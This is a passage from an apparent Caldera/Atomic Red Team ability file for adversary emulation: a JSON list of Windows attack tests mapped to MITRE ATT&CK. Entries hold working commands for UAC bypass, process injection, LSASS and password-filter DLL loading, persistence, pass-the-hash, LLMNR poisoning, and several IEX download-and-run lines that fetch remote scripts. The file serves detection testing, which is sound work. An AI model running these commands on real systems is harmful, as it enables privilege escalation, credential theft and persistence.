            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore && powershell Stop-Process -Name mmc -Force -ErrorAction Ignore",
                    "command": "\"%temp%\\uacme\\39 Akagi64.exe\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "702e25bac965a0efbe89a73ef3f62166",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "32137d0b1dbea4a5827fc5d0d1dc8d36": {
        "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tShell API\n\nMethod: Environment variables expansion\n\nTarget:\t\\system32\\svchost.exe via \\system32\\schtasks.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDiskCleanupEnvironmentVariable\n\nUCM Method:\tUacMethodDiskSilentCleanup\n\nhttps://github.com/hfiref0x/UACME\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore && powershell Stop-Process -Name mmc -Force -ErrorAction Ignore",
                    "command": "\"%temp%\\uacme\\34 Akagi64.exe\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "32137d0b1dbea4a5827fc5d0d1dc8d36",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "95d3434abf05854b0e24ee2bc2d4a56c": {
        "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Leo Davidson derivative\n\nType:\tDll Hijack\n\nMethod: IFileOperation\n\nTarget:\t\\system32\\pkgmgr.exe\n\nComponent: DismCore.dll\n\nImplementation:\tucmDismMethod\n\nUCM Method:\tUacMethodDISM\n\nhttps://github.com/hfiref0x/UACME\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore && powershell Stop-Process -Name mmc -Force -ErrorAction Ignore",
                    "command": "\"%temp%\\uacme\\23 Akagi64.exe\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "95d3434abf05854b0e24ee2bc2d4a56c",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "ee454be9197890de62705ce6255933fd": {
        "description": "Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1053.005",
            "name": "Scheduled Task/Job: Scheduled Task"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "SCHTASKS /Delete /TN spawn /F >nul 2>&1",
                    "command": "SCHTASKS /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST 20:10",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ee454be9197890de62705ce6255933fd",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "f1e0b70af38aef921fee49022045546b": {
        "description": "Install a shim database. This technique is used for privilege escalation and bypassing user access control.\nUpon execution, \"Installation of AtomicShim complete.\" will be displayed. To verify the shim behavior, run \nthe AtomicTest.exe from the <PathToAtomicsFolder>\\\\T1546.011\\\\bin directory. You should see a message box appear\nwith \"Atomic Shim DLL Test!\" as defined in the AtomicTest.dll. To better understand what is happening, review\nthe source code files is the <PathToAtomicsFolder>\\\\T1546.011\\\\src directory.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.011",
            "name": "Event Triggered Execution: Application Shimming"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "sdbinst.exe -u 729b9b_AtomicShimx86.sdb >nul 2>&1",
                    "command": "sdbinst.exe 729b9b_AtomicShimx86.sdb",
                    "payloads": [
                        "729b9b_AtomicShimx86.sdb",
                        "729b9b_AtomicShimx86.sdb"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "f1e0b70af38aef921fee49022045546b",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "cea3d9d440f5f24e458717e3281423e7": {
        "description": "Process Injection using C#\nreference: https://github.com/pwndizzle/c-sharp-memory-injection\nExcercises Five Techniques\n1. Process injection\n2. ApcInjectionAnyProcess\n3. ApcInjectionNewProcess\n4. IatInjection\n5. ThreadHijack\nUpon successful execution, cmd.exe will execute T1055.exe, which exercises 5 techniques. Output will be via stdout.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1055.004",
            "name": "Process Injection: Asynchronous Procedure Call"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "0cb710_T1055.exe",
                    "payloads": [
                        "0cb710_T1055.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "cea3d9d440f5f24e458717e3281423e7",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "9335c7238f4afad3ecb3ba6a0349e552": {
        "description": "Create an scheduled task that executes calc.exe after user login from XML that contains hidden setting attribute. \nThis technique was seen several times in tricbot malware and also with the targetted attack campaigne the industroyer2.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1053.005",
            "name": "Scheduled Task/Job: Scheduled Task"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Unregister-ScheduledTask -TaskName \"atomic red team\" -confirm:$false >$null 2>&1",
                    "command": "$xml = [System.IO.File]::ReadAllText(\"PathToAtomicsFolder\\T1053.005\\src\\T1053_05_SCTASK_HIDDEN_ATTRIB.xml\"); Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9335c7238f4afad3ecb3ba6a0349e552",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f4ae0566412bb12efb2d03466b4546e7": {
        "description": "https://github.com/BeichenDream/BadPotato\nPrivilege escalation using named pipe connections",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1134.001",
            "name": "Access Token Manipulation: Token Impersonation/Theft"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "taskkill /f /im notepad.exe",
                    "command": "cd $env:temp; Start-Process .\\BadPotato.exe notepad.exe; Start-Sleep -Second 20; Stop-Process -Name \"notepad\" -force -erroraction silentlycontinue; Stop-Process -Name \"BadPotato\" -force -erroraction silentlycontinue",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f4ae0566412bb12efb2d03466b4546e7",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "fade9013a73781990c2cbfd05de4cd3a": {
        "description": "Download an executable from github and start it as a service.\nUpon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1543.003",
            "name": "Create or Modify System Process: Windows Service"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "sc.exe stop AtomicTestService_CMD >nul 2>&1 && sc.exe delete AtomicTestService_CMD >nul 2>&1",
                    "command": "sc.exe create AtomicTestService_CMD binPath= 411da5_AtomicService.exe && sc.exe start AtomicTestService_CMD",
                    "payloads": [
                        "411da5_AtomicService.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "fade9013a73781990c2cbfd05de4cd3a",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "c13fdd68cb4b40650f00e5451ffde021": {
        "description": "Establishes persistence by creating a new time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe new time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.003",
            "name": "Time Providers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "net stop w32time; reg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /f; rm -force C:\\Users\\Public\\AtomicTest.dll; net start w32time",
                    "command": "net stop w32time; Copy-Item d97818_AtomicTest.dll C:\\Users\\Public\\AtomicTest.dll; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\AtomicTest.dll\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f; net start w32time",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "d97818_AtomicTest.dll"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "c13fdd68cb4b40650f00e5451ffde021",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "8831364340e3e4888f59e21bbfedd7de": {
        "description": "GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded.\nUpon execution, calc.exe will be opened.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1574.002",
            "name": "Hijack Execution Flow: DLL Side-Loading"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "taskkill /F /IM calculator.exe >nul 2>&1",
                    "command": "67baa5_GUP.exe",
                    "payloads": [
                        "67baa5_GUP.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "8831364340e3e4888f59e21bbfedd7de",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "f39161b2fa5d692ebe3972e0680a8f97": {
        "description": "bat files can be placed in and executed from the startup folder to maintain persistance.\nUpon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.001",
            "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\" -ErrorAction Ignore; Remove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\" -ErrorAction Ignore",
                    "command": "Copy-Item bea90a_batstartup.bat \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"; Copy-Item bea90a_batstartup.bat \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"; Start-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"; Start-Process \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "bea90a_batstartup.bat"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "f39161b2fa5d692ebe3972e0680a8f97",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "1b82e5d4e4707c4923e7a0f8143b3186": {
        "description": "Executes cmd.exe\nNote: deprecated in Windows 8+\n\nUpon successful execution, cmd.exe will spawn at.exe and create a scheduled task that will spawn cmd at a specific time.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1053.002",
            "name": "Scheduled Task/Job: At"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "at 13:20 /interactive cmd",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1b82e5d4e4707c4923e7a0f8143b3186",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "d9c719f978740efa1ed6db8fbc749706": {
        "description": "Select Desired ports for packet capture \nhttps://lolbas-project.github.io/lolbas/Binaries/Pktmon/",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1040",
            "name": "Network Sniffing"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "pktmon filter remove",
                    "command": "pktmon.exe filter add -p 445",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d9c719f978740efa1ed6db8fbc749706",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "50598e403dbf17cf341e4e08a9c5b0d1": {
        "description": "This test will temporarily modify the service Fax by changing the binPath to PowerShell\nand will then revert the binPath change, restoring Fax to its original state.\nUpon successful execution, cmd will modify the binpath for `Fax` to spawn powershell. Powershell will then spawn.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1543.003",
            "name": "Create or Modify System Process: Windows Service"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "sc config Fax binPath= \"C:\\WINDOWS\\system32\\fxssvc.exe\" >nul 2>&1",
                    "command": "sc config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1543.003 Test'\\\"\" && sc start Fax",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "50598e403dbf17cf341e4e08a9c5b0d1",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "25faa3107b46a209e3796752ca49cca9": {
        "description": "Hooks functions in PowerShell to read TLS Communications\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1056.004",
            "name": "Input Capture: Credential API Hooking"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "mavinject $pid /INJECTRUNNING; Invoke-WebRequest",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "25faa3107b46a209e3796752ca49cca9",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "d3ef4145e4144fd694514b1c5cc17350": {
        "description": "RunOnce Key Persistence.\n\nUpon successful execution, cmd.exe will modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via stdout. \n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.001",
            "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "REG DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /f >nul 2>&1",
                    "command": "REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\Path\\AtomicRedTeam.dll\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d3ef4145e4144fd694514b1c5cc17350",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "ae73a53476995f46b71f11709f525319": {
        "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1134.001",
            "name": "Access Token Manipulation: Token Impersonation/Theft"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ae73a53476995f46b71f11709f525319",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "6623d6925383b47a30d6c7e5e8c4d752": {
        "description": "Will start a packet capture and store log file as t1040.etl.\nhttps://lolbas-project.github.io/lolbas/Binaries/Pktmon/",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1040",
            "name": "Network Sniffing"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del %TEMP%\\t1040.etl",
                    "command": "pktmon.exe start --etw  -f %TEMP%\\t1040.etl && TIMEOUT /T 5 >nul 2>&1 && pktmon.exe stop",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6623d6925383b47a30d6c7e5e8c4d752",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "63bbedafba2f541552ac3579e9e3737b": {
        "description": "Adversaries can take advantage of insecure library loading by PowerShell to load a vulnerable version of amsi.dll in order to bypass AMSI (Anti-Malware Scanning Interface)\nhttps://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/\n\nUpon successful execution, powershell.exe will be copied and renamed to updater.exe and load amsi.dll from a non-standard path.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1574.001",
            "name": "Hijack Execution Flow: DLL Search Order Hijacking"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del %APPDATA%\\updater.exe >nul 2>&1 && del %APPDATA%\\amsi.dll >nul 2>&1",
                    "command": "copy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\updater.exe && copy %windir%\\System32\\amsi.dll %APPDATA%\\amsi.dll && %APPDATA%\\updater.exe -Command exit",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "63bbedafba2f541552ac3579e9e3737b",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "72249c1e9ffe7d8f30243d838e0791ca": {
        "description": "Change Service registry ImagePath of a bengin service to a malicious file\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1574.011",
            "name": "Hijack Execution Flow: Services Registry Permissions Weakness"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "sc.exe delete calcservice",
                    "command": "reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\calcservice\" /f /v ImagePath /d \"%windir%\\system32\\cmd.exe\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "72249c1e9ffe7d8f30243d838e0791ca",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "8ce073cf3170576e1f5c6e4d06e1873a": {
        "description": "Use Invoke-WMIExec to Pass the Hash\nNote: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1550.002",
            "name": "Use Alternate Authentication Material: Pass the Hash"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8ce073cf3170576e1f5c6e4d06e1873a",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "e40aa036b0ae5f73646c1576ad09b3a0": {
        "description": "Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.\nThe binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection\nSource is in src folder. \nThis does require a reboot to see the filter loaded into lsass.exe. \nIt does require Administrative privileges to import the clean registry values back into LSA, it is possible you may have to manually do this after for cleanup.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1556.002",
            "name": "Modify Authentication Process: Password Filter DLL"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "reg.exe import PathToAtomicsFolder\\T1556.002\\lsa_backup.reg; remove-item C:\\Windows\\System32\\AtomicRedTeamPWFilter.dll",
                    "command": "reg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ PathToAtomicsFolder\\T1556.002\\lsa_backup.reg; $passwordFilterName = (Copy-Item \"PathToAtomicsFolder\\T1556.002\\bin\\AtomicRedTeamPWFilter.dll\" -Destination \"C:\\Windows\\System32\" -PassThru).basename; $lsaKey = Get-Item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"; $notificationPackagesValues = $lsaKey.GetValue(\"Notification Packages\"); $notificationPackagesValues += $passwordFilterName; Set-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" \"Notification Packages\" $notificationPackagesValues",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e40aa036b0ae5f73646c1576ad09b3a0",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "5ee8fce78c4cef28c4e6ecebe77bdba4": {
        "description": "Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. This Atomic will run continuously until you cancel it or it times out.",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1557.001",
            "name": "Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1\" -UseBasicParsing); Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5ee8fce78c4cef28c4e6ecebe77bdba4",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "b6e5dacd16b065720d02478584753a8e": {
        "description": "The following Atomic will modify an undocumented registry key that may be abused to load a arbitrary DLL into LSASS. \n\nUpon execution, the registry key will be modified and a value will contain the path to the DLL. \nReference: https://blog.xpnsec.com/exploring-mimikatz-part-1/ and source https://github.com/oxfemale/LogonCredentialsSteal\nNote that if any LSA based protection is enabled, this will most likely not be successful with LSASS.exe loading the DLL.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.008",
            "name": "Boot or Logon Autostart Execution: LSASS Driver"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\" -Name \"LsaDbExtPt\" -ErrorAction Ignore | Out-Null",
                    "command": "New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt -Value \"$env:TEMP\\lsass_lib.dll\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b6e5dacd16b065720d02478584753a8e",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "67869d578a1ddad7356f4e3d35a0b2cd": {
        "description": "This test simulates an adversary leveraging bitsadmin.exe to download\nand execute a payload leveraging PowerShell\n\nUpon execution you will find a github markdown file downloaded to the Temp directory\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1197",
            "name": "BITS Jobs"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\bitsadmin2_flag.ps1 -ErrorAction Ignore",
                    "command": "Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination $env:TEMP\\bitsadmin2_flag.ps1",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "67869d578a1ddad7356f4e3d35a0b2cd",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "1f15ab22c39a9b6bb2bb0d77276dfcb3": {
        "description": "Adds a non-malicious executable shortcut link to the current users startup directory. Test can be verified by going to the users startup directory and checking if the shortcut link exists. ",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.001",
            "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\" -ErrorAction Ignore",
                    "command": "$Target = \"C:\\Windows\\System32\\calc.exe\"; $ShortcutLocation = \"$home\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\"; $WScriptShell = New-Object -ComObject WScript.Shell; $Create = $WScriptShell.CreateShortcut($ShortcutLocation); $Create.TargetPath = $Target; $Create.Save()",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1f15ab22c39a9b6bb2bb0d77276dfcb3",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "edcae1b254a8bd61c497f63a82ee5cc0": {
        "description": "This module executes notepad.exe from within the WINWORD.EXE process\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1055.012",
            "name": "Process Injection: Process Hollowing"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) ; Invoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"Word\" -sub \"Exploit\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "edcae1b254a8bd61c497f63a82ee5cc0",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "2db3b2385ba856424bfe130f69fc0529": {
        "description": "This test first create a custom CLSID class pointing to the Windows Script Component runtime DLL. This DLL looks for the ScriptletURL key to get the location of the script to execute.\nThen, it hijacks the CLSID for the Work Folders Logon Synchronization to establish persistence on user logon by creating the 'TreatAs' with the malicious CLSID as default value. The\ntest is validated by running 'rundll32.exe -sta \"AtomicTest\"' to avoid logging out.\n\nReferences:\n\nhttps://youtu.be/3gz1QmiMhss?t=1251\n\nhttps://github.com/enigma0x3/windows-operating-system-archaeology",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.015",
            "name": "Event Triggered Execution: Component Object Model Hijacking"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\" /f; reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /f; reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\" /f",
